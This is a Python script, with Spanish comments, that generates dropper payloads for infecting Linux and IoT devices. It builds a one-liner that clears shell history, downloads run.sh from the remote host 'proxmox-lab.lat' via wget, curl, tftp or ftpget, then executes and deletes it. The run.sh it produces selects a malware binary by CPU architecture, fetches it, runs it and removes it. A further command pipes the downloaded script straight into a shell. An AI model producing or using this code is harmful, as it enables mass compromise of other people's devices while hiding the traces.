#!/usr/bin/env python3
import sys

DOMAIN = "proxmox-lab.lat"
BINARY_PREFIX = "main_"
SCRIPT_NAME = "run.sh"

# Mapeo de uname -m -> sufijo del binario (según tus archivos)
ARCH_MAP = {
    "x86_64": "x86_64",
    "i686":   "x86",
    "i386":   "x86",
    "armv7l": "arm7",
    "armv6l": "arm6",
    "armv5tel": "arm5",
    "armv4l": "arm",
    "mips":   "mips",
    "mipsel": "mpsl",
    "m68k":   "m68k",
    "ppc":    "ppc",
    "sh4":    "sh4",
}

# Métodos para descargar run.sh (orden de preferencia)
DOWNLOAD_SCRIPT_METHODS = [
    ("wget",    "wget -qO {script} http://{domain}/{script}"),
    ("curl",    "curl -s -o {script} http://{domain}/{script}"),
    ("tftp",    "tftp {domain} -c get {script}"),
    ("ftpget",  "ftpget -v -u anonymous -p anonymous -P 21 {domain} {script} {script}"),
]

def generate_main_payload():
    """Genera el one‑liner que descarga run.sh con múltiples métodos y lo ejecuta."""
    parts = []
    for i, (cmd, tmpl) in enumerate(DOWNLOAD_SCRIPT_METHODS):
        if i == 0:
            parts.append(f"if command -v {cmd} >/dev/null 2>&1; then")
        else:
            parts.append(f"elif command -v {cmd} >/dev/null 2>&1; then")
        # Add a semicolon after the command
        parts.append(f"    {tmpl.format(domain=DOMAIN, script=SCRIPT_NAME)};")
    parts.append("else")
    parts.append("    exit 1;")
    parts.append("fi")

    download_script = " ".join(parts)
    payload = (
        f"unset HISTFILE; "
        f"cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; "
        f"{download_script}; "
        f"chmod +x {SCRIPT_NAME}; "
        f"./{SCRIPT_NAME}; "
        f"rm -f {SCRIPT_NAME}"
        f"echo "vT"
    )
    payload = ' '.join(payload.split())
    return payload

def generate_run_script():
    """Genera el contenido de run.sh (descarga y ejecuta el binario adecuado)."""
    # Construir case para arquitecturas
    case_items = []
    for arch, suffix in ARCH_MAP.items():
        case_items.append(f"    {arch}) bin='{BINARY_PREFIX}{suffix}' ;;")
    case_block = "\n".join(case_items)

    # Métodos para descargar el binario (misma lógica)
    methods = [
        "if command -v wget >/dev/null 2>&1; then",
        "    wget -qO /tmp/$bin http://$DOMAIN/$bin",
        "elif command -v curl >/dev/null 2>&1; then",
        "    curl -s -o /tmp/$bin http://$DOMAIN/$bin",
        "elif command -v tftp >/dev/null 2>&1; then",
        "    tftp $DOMAIN -c get $bin /tmp/$bin",
        "elif command -v ftpget >/dev/null 2>&1; then",
        "    ftpget -v -u anonymous -p anonymous -P 21 $DOMAIN $bin /tmp/$bin",
        "else",
        "    exit 1",
        "fi"
    ]
    download_binary = "\n".join(methods)

    run_script = f"""#!/bin/sh
# run.sh - Descarga y ejecuta el binario adecuado para la arquitectura
DOMAIN="{DOMAIN}"
PREFIX="{BINARY_PREFIX}"

cd /tmp || cd /var/run || cd /mnt || cd /root || cd /

arch=$(uname -m)
case $arch in
{case_block}
    *) exit 1 ;;
esac

{download_binary}

chmod +x /tmp/$bin
/tmp/$bin
rm -f /tmp/$bin
"""
    return run_script

def generate_simple_command():
    """Comando simple que descarga run.sh desde HTTP y lo ejecuta en memoria."""
    return f"sh -c \"$(wget -qO- http://{DOMAIN}/{SCRIPT_NAME} 2>/dev/null || curl -s http://{DOMAIN}/{SCRIPT_NAME})\""

def main():
    print("=== PAYLOAD PRINCIPAL (one-liner) ===")
    print(generate_main_payload())
    print("\n=== CONTENIDO DE run.sh (guárdalo en tu servidor) ===")
    print(generate_run_script())
    print("\n=== COMANDO SIMPLE (usa wget/curl) ===")
    print(generate_simple_command())

if __name__ == "__main__":
    main()